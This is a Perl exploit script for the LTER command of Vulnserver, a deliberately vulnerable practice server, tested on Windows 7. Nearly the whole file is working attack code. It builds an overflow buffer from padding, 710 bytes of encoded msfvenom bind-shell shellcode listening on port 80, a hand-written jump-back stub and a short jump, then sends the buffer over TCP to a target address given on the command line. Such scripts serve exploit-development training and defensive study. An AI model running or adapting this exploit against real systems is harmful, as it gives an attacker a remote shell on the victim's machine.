#!/usr/bin/perl

# Vulnserver LTER exploit (https://github.com/stephenbradshaw/vulnserver)
# Tested against Microsoft Windows 7 Professional

use IO::Socket;

if($ARGV[0] eq ''){
die "Proper usage: $0 IP_ADDRESS PORT \n\n"
}

$badheader = "LTER /.:/";
$baddata = "\x41" x 1719; # exact offset match at 3519

# msfvenom -p windows/shell_bind_tcp LPORT=80 BufferRegister=ESP -e x86/alpha_mixed -b "\x00\x0a\x0d" -f perl -v baddata
# Payload size: 710 bytes

$baddata .= "\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30" .
"\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42" .
"\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x59\x78" .
"\x4b\x32\x47\x70\x43\x30\x75\x50\x33\x50\x4c\x49\x4a\x45" .
"\x55\x61\x79\x50\x31\x74\x4e\x6b\x72\x70\x76\x50\x4c\x4b" .
"\x43\x62\x74\x4c\x6e\x6b\x50\x52\x72\x34\x6e\x6b\x50\x72" .
"\x37\x58\x34\x4f\x68\x37\x62\x6a\x75\x76\x30\x31\x69\x6f" .
"\x4e\x4c\x35\x6c\x75\x31\x43\x4c\x37\x72\x74\x6c\x47\x50" .
"\x4f\x31\x5a\x6f\x36\x6d\x36\x61\x4a\x67\x6a\x42\x58\x72" .
"\x46\x32\x51\x47\x6c\x4b\x66\x32\x74\x50\x6e\x6b\x43\x7a" .
"\x57\x4c\x4e\x6b\x62\x6c\x47\x61\x44\x38\x58\x63\x53\x78" .
"\x63\x31\x5a\x71\x63\x61\x4e\x6b\x46\x39\x55\x70\x46\x61" .
"\x39\x43\x4e\x6b\x51\x59\x75\x48\x39\x73\x54\x7a\x67\x39" .
"\x6c\x4b\x34\x74\x4c\x4b\x66\x61\x58\x56\x46\x51\x79\x6f" .
"\x4e\x4c\x4f\x31\x6a\x6f\x74\x4d\x43\x31\x79\x57\x66\x58" .
"\x39\x70\x54\x35\x6b\x46\x37\x73\x63\x4d\x39\x68\x35\x6b" .
"\x33\x4d\x57\x54\x74\x35\x6b\x54\x36\x38\x6c\x4b\x72\x78" .
"\x57\x54\x33\x31\x5a\x73\x31\x76\x4c\x4b\x44\x4c\x72\x6b" .
"\x4e\x6b\x72\x78\x75\x4c\x76\x61\x48\x53\x6c\x4b\x33\x34" .
"\x6e\x6b\x45\x51\x78\x50\x4f\x79\x47\x34\x36\x44\x77\x54" .
"\x43\x6b\x51\x4b\x35\x31\x42\x79\x72\x7a\x46\x31\x59\x6f" .
"\x59\x70\x73\x6f\x73\x6f\x52\x7a\x4e\x6b\x55\x42\x4a\x4b" .
"\x6c\x4d\x31\x4d\x62\x48\x37\x43\x75\x62\x37\x70\x67\x70" .
"\x50\x68\x62\x57\x53\x43\x57\x42\x61\x4f\x31\x44\x70\x68" .
"\x42\x6c\x63\x47\x55\x76\x44\x47\x39\x6f\x38\x55\x6c\x78" .
"\x4c\x50\x73\x31\x43\x30\x43\x30\x65\x79\x79\x54\x72\x74" .
"\x32\x70\x52\x48\x71\x39\x4f\x70\x70\x6b\x53\x30\x59\x6f" .
"\x68\x55\x32\x4a\x66\x68\x50\x59\x66\x30\x6b\x52\x4b\x4d" .
"\x63\x70\x36\x30\x51\x50\x42\x70\x42\x48\x68\x6a\x74\x4f" .
"\x6b\x6f\x4b\x50\x6b\x4f\x6e\x35\x6a\x37\x33\x58\x55\x52" .
"\x47\x70\x75\x50\x32\x70\x6e\x69\x39\x76\x72\x4a\x52\x30" .
"\x62\x76\x56\x37\x53\x58\x69\x52\x4b\x6b\x35\x67\x61\x77" .
"\x59\x6f\x4b\x65\x52\x77\x71\x78\x6f\x47\x7a\x49\x76\x58" .
"\x79\x6f\x39\x6f\x58\x55\x32\x77\x35\x38\x42\x54\x68\x6c" .
"\x77\x4b\x6b\x51\x69\x6f\x4b\x65\x61\x47\x4c\x57\x51\x78" .
"\x30\x75\x50\x6e\x70\x4d\x70\x61\x4b\x4f\x6e\x35\x70\x68" .
"\x75\x33\x32\x4d\x35\x34\x35\x50\x4d\x59\x48\x63\x61\x47" .
"\x30\x57\x56\x37\x65\x61\x49\x66\x73\x5a\x54\x52\x32\x79" .
"\x46\x36\x7a\x42\x4b\x4d\x62\x46\x68\x47\x30\x44\x76\x44" .
"\x47\x4c\x73\x31\x57\x71\x6c\x4d\x77\x34\x45\x74\x66\x70" .
"\x38\x46\x47\x70\x61\x54\x36\x34\x72\x70\x71\x46\x43\x66" .
"\x73\x66\x42\x66\x71\x46\x62\x6e\x30\x56\x53\x66\x52\x73" .
"\x50\x56\x45\x38\x64\x39\x7a\x6c\x35\x6f\x6b\x36\x79\x6f" .
"\x6e\x35\x4d\x59\x6b\x50\x72\x6e\x76\x36\x62\x66\x59\x6f" .
"\x46\x50\x51\x78\x56\x68\x4d\x57\x55\x4d\x65\x30\x59\x6f" .
"\x49\x45\x6d\x6b\x58\x70\x6d\x65\x4c\x62\x53\x66\x61\x78" .
"\x4e\x46\x6c\x55\x6f\x4d\x4f\x6d\x39\x6f\x4a\x75\x75\x6c" .
"\x36\x66\x31\x6c\x35\x5a\x6f\x70\x39\x6b\x6b\x50\x61\x65" .
"\x57\x75\x4f\x4b\x50\x47\x45\x43\x54\x32\x32\x4f\x72\x4a" .
"\x77\x70\x76\x33\x49\x6f\x6b\x65\x41\x41";

$baddata .= "\x43" x (3392-length($baddata));

$baddata .= "\x54\x58\x66\x05\x1E\x04\x50\x59\x56\x58\x2D\x3D\x6F\x6F\x6F\x50\x5A\x51\x58\x66\x05\x70\x05\x66\x05\x70\x01\x50\x5C\x56\x58\x2D\x01\x1E\x6F\x6F\x51\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x75\x1E\x6F\x6F\x50"; # Jump back to beginning of shellcode 54 bytes total

#badchars = \x00\x0a\x0d\x80-\xff
#badchar \xff translates to \x80

$baddata .= "\x43" x (3515-length($baddata));
$baddata .= "\x4c\x4c\x77\xff"; # short JMP back 127 bytes

$baddata .= "\x73\x26\x40"; # demonstrating 3-byte overwrite

$socket=IO::Socket::INET->new(
Proto=>"tcp",
PeerAddr=>"$ARGV[0]",
PeerPort=>"$ARGV[1]"
)or die("Could not connect to server");

$socket->recv($sd,1024);
print $sd;
$socket->send($badheader.$baddata);
